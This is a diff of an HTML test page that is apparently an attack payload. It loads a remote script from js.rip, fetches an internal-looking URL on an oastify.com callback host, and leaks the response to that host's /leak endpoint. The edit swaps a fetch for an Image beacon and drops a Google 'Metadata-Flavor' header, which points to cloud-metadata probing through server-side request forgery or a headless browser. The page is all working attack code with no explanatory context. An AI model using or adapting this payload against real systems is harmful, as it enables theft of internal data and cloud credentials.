@@ -4,16 +4,13 @@
   <title>Test Page</title>
   <script src="https://js.rip/5mw8at9w5s"></script>
   <script>
-    const targetUrl = "http://internal.av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/"; // ✅ No trailing space
+    const targetUrl = "http://internal.av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/";
 
-    fetch(targetUrl, {
-      headers: { "Metadata-Flavor": "Google" }
-    })
+    fetch(targetUrl)
     .then(r => r.text())
     .then(data => {
-      fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/leak?value=" + encodeURIComponent(data));
+      new Image().src = "https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/leak?value=" + encodeURIComponent(data);
     });
-    // No .catch — only 2 hits if fetch succeeds
   </script>
 </head>
 <body>
